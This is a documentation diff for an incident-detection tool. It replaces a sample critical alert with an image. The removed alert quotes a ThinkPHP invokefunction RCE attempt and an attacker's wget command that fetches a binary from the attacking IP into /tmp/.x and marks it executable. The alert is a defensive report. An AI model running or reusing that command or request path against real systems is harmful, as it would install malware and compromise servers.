@@ -136,21 +136,7 @@ Any incident whose severity is `medium` or higher now sends a message. This one 
 delivered by a real run — the body below the header is the action agent's own
 wording, not a template:
 
-```
-[BOT] CRITICAL incident
-ID: inc_8bf82c50344d
-IP: 185.244.25.221
-Verdict: malicious
-Types: rce
-Action: block
-
-CRITICAL: Potential Remote Code Execution (RCE) success from 185.244.25.221 on
-ThinkPHP v5.x (/index.php?s=/index/think/invokefunction). The attacker attempted
-to run 'wget http://185.244.25.221/bins/x86 -O /tmp/.x;chmod 777 /tmp/.x' which
-returned a 200 OK response with 4096 bytes. The IP has been blocked. Immediate
-investigation of the server for potential compromise and malware infection
-(under /tmp/.x) is required.
-```
+<img width="523" height="342" alt="image" src="https://github.com/user-attachments/assets/8bbc9d38-0976-484b-bbb7-f0ce3fc35a97" />
 
 The detector never saw the string `ThinkPHP`, has no notion of a framework version
 and cannot tell a 200 from a 404. All of that — the vulnerable component, the
